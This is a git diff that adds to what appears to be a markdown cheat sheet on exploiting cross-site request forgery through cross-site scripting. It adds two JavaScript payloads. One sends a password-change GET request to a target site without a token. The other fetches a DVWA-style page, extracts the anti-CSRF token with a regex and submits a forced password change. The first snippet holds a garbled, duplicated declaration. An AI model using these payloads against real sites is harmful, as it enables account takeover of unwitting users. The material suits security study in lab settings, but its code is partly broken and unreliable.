@@ -65,3 +65,45 @@ password=newpass&comfirm_password=newpass
             document.forms[0].submit();
         </script>
 ```
+
+**Exploit CSRF Vulnerability Via XSS (GET Method)**
+
+>Whithout token
+```
+<script>
+const HttpRequest = new XMLHttpRequest();
+const url=const url = 'http://target-vuln-web.com/user/new_password?password=newpass&comfirm_password=newpass'
+;
+HttpRequest.open("GET", url);
+HttpRequest.send();
+</script>
+```
+
+>With token
+```
+ <script>
+        function change_password(){
+            const request = new XMLHttpRequest();
+            const url = "http://localhost:80/vulnerabilities/csrf/"
+            
+
+            request.open("GET", url);
+            request.onreadystatechange = () => {
+            if (request.readyState === request.DONE && request.status === 200) {
+
+                var response = request.responseText;
+
+                var user_token = /[a-f0-9]{32}/g.exec(response)[0]
+                var payload = "http://localhost:80/vulnerabilities/csrf/?password_new=newpass&password_conf=newpass&Change=Change&user_token="+user_token;
+                var second_request = new XMLHttpRequest();
+                second_request.open("GET", payload);
+                second_request.send()
+
+            }
+            };
+            request.send()
+        
+    }
+        </script>
+</body>
+```
